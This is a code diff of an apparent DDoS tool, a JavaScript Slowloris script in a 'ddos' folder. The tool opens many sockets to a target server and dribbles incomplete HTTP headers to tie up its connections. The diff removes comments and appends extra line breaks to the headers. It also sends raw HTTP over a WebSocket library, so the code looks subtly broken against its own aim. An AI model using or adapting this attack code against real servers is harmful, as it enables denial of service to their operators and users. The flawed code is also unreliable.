@@ -1,4 +1,3 @@
-// main/ddos/slowloris.js
 import { WebSocket } from 'ws';
 
 function slowloris(target, numSockets) {
@@ -20,7 +19,7 @@ function slowloris(target, numSockets) {
 
         console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);
 
-        const sockets = new Array(numSockets); // Store sockets for potential later management
+        const sockets = new Array(numSockets);
 
         for (let i = 0; i < numSockets; i++) {
             createSocket(hostname, port, i, isSecure, path);
@@ -35,7 +34,7 @@ function slowloris(target, numSockets) {
                     rejectUnauthorized: false
                 });
 
-                sockets[index] = socket; // Store the socket
+                sockets[index] = socket;
 
                 socket.on('open', () => {
                     console.log(`Socket ${index + 1} opened.`);
@@ -56,12 +55,12 @@ function slowloris(target, numSockets) {
                 });
             } catch (socketError) {
                 console.error(`Error creating socket ${index + 1}:`, socketError.message);
-                cleanupSocket(socket, index); // Ensure cleanup even on creation error
+                cleanupSocket(socket, index);
             }
         }
 
         function sendInitialHeader(socket, hostname, path) {
-            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n`; // Removed extra \r\n.  Important!
+            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n\r\n`;
             try {
                 socket.send(initialHeader);
             } catch (error) {
@@ -71,7 +70,7 @@ function slowloris(target, numSockets) {
         }
 
         function sendKeepAliveHeader(socket) {
-            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n";
+            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n\r\n";
             try {
                 socket.send(keepAliveHeader);
             } catch (error) {
@@ -93,7 +92,7 @@ function slowloris(target, numSockets) {
                 }
             } finally {
                if(index !== undefined && sockets[index] === socket){
-                   sockets[index] = null; //Remove from array to prevent memory leaks
+                   sockets[index] = null;
                }
             }
         }
